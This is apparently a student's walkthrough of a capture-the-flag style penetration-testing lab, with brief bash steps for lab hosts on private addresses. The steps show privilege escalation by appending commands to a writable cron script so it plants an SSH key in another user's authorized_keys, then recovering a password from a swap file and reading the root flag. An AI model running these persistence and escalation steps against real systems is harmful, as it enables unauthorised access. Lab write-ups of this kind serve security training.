## h 1.1 p
```bash
ssh student@192.168.100.101 #pjatk
ssh pentest@192.168.200.151
```

## h 1.2 p
```bash
#Idk chyba git ale nie wiem :3
cat /etc/crontab
ls -l /opt/clean.sh
echo "mkdir -p /home/developer/.ssh" >> /opt/clean.sh
echo "echo $(cat /home/pentest/.ssh/authorized_keys) >> /home/developer/.ssh/authorized_keys" >> /opt/clean.sh
```

## h 1.3 p
```bash
#If 1.2 worked on 3rd command, before exit type 'echo "echo $(cat /home/pentest/.ssh/authorized_keys) >> /home/developer/.ssh/authorized_keys" >> /opt/clean.sh' too
exit
ssh developer@192.168.200.151
```

## h 1.4 p
```bash
cat .password.txt.swp
[ANSWER]
su
#Type [ANSWER] as password
```

## h 1.5 p
```bash
cat /root/root.txt
[ANSWER]
#Copy flag to website
```
